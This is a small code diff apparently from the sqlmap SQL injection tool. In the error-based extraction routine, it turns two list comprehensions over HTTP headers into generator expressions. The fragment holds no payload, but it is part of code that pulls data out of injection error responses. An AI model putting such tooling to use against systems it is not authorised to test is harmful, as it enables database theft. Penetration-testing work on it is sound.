@@ -133,7 +133,7 @@ def _oneShotErrorUse(expression, field=None, chunkTest=False):
                 output = reduce(lambda x, y: x if x is not None else y, (\
                         extractRegexResult(check, page), \
                         extractRegexResult(check, threadData.lastHTTPError[2] if wasLastResponseHTTPError() else None), \
-                        extractRegexResult(check, listToStrValue([headers[header] for header in headers if header.lower() != HTTP_HEADER.URI.lower()] if headers else None)), \
+                        extractRegexResult(check, listToStrValue((headers[header] for header in headers if header.lower() != HTTP_HEADER.URI.lower()) if headers else None)), \
                         extractRegexResult(check, threadData.lastRedirectMsg[1] if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == threadData.lastRequestUID else None)), \
                         None)
 
@@ -142,7 +142,7 @@ def _oneShotErrorUse(expression, field=None, chunkTest=False):
                 else:
                     trimmed = extractRegexResult(trimcheck, page) \
                         or extractRegexResult(trimcheck, threadData.lastHTTPError[2] if wasLastResponseHTTPError() else None) \
-                        or extractRegexResult(trimcheck, listToStrValue([headers[header] for header in headers if header.lower() != HTTP_HEADER.URI.lower()] if headers else None)) \
+                        or extractRegexResult(trimcheck, listToStrValue((headers[header] for header in headers if header.lower() != HTTP_HEADER.URI.lower()) if headers else None)) \
                         or extractRegexResult(trimcheck, threadData.lastRedirectMsg[1] if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == threadData.lastRequestUID else None)
 
                     if trimmed:
